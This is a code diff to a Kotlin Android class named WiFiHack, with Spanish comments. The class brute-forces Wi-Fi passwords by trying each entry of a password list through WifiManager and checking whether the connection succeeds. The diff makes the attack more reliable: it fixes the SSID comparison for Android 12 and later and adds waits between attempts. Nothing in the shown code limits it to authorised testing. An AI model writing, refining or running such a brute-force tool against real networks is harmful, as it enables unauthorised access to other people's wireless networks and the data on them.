@@ -88,6 +88,7 @@ class WiFiHack(private val context: Context) {
         bruteForceCancelled.set(false)
         Thread {
             val cleanSsid = "\"${ssid.removeSurrounding("\"")}\""
+            val targetSsid = cleanSsid.removeSurrounding("\"") // SSID sin comillas para comparar
             for ((index, password) in passwords.withIndex()) {
                 if (bruteForceCancelled.get()) { onFinish(false); return@Thread }
                 onProgress(index + 1, passwords.size, password)
@@ -103,16 +104,23 @@ class WiFiHack(private val context: Context) {
                     val netId = wifiManager.addNetwork(config)
                     if (netId != -1) {
                         wifiManager.disconnect()
+                        Thread.sleep(300) // esperar a que se complete la desconexión
                         if (wifiManager.enableNetwork(netId, true)) {
                             Thread.sleep(delayMs.toLong())
                             val info = wifiManager.connectionInfo
-                            if (info != null && info.ssid == cleanSsid && info.networkId == netId) {
-                                onFound(password); onFinish(true); return@Thread
+                            // Comparar SSIDs sin comillas para compatibilidad con Android 12+
+                            // (getSSID() devuelve sin comillas en API 31+, con comillas en versiones anteriores)
+                            if (info != null) {
+                                val connectedSsid = info.ssid?.removeSurrounding("\"") ?: ""
+                                if (connectedSsid == targetSsid && info.networkId == netId) {
+                                    onFound(password); onFinish(true); return@Thread
+                                }
                             }
                         }
                         wifiManager.removeNetwork(netId)
                         wifiManager.saveConfiguration()
                         wifiManager.reconnect()
+                        Thread.sleep(200) // esperar antes del siguiente intento
                     }
                 } catch (_: Exception) {}
             }
